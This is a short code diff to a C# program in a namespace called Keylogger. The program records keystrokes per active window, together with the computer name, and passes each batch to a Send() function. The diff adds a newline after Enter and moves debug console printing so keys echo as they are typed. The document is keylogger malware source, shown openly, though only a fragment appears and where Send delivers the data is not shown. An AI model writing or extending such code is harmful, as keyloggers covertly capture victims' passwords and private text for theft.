@@ -30,7 +30,7 @@ namespace Keylogger
             string key = "";
             if(args.Key == Keys.Enter)
             {
-                key = "[Enter]";
+                key = "[Enter]\n";
             }
             else if (args.Key == Keys.Back)
             {
@@ -49,20 +49,24 @@ namespace Keylogger
             if(key != "" && loggerData != null && args.WindowName == loggerData.WindowName)
             {
                 loggerData.Keys += key;
+                if (debug)
+                {
+                    Console.Write(key);
+                }
             }
             else if(key != "")
             {
                 if(loggerData != null)
                 {
-                    if (debug)
-                    {
-                        Console.WriteLine("[{0}]", loggerData.WindowName);
-                        Console.WriteLine(loggerData.Keys);
-                    }
                     Send(loggerData);
                 }
 
                 loggerData = new LoggerData(computerName, args.WindowName, key);
+                if (debug)
+                {
+                    Console.WriteLine("\n[{0}]", loggerData.WindowName);
+                    Console.Write(key);
+                }
             }
         }
 
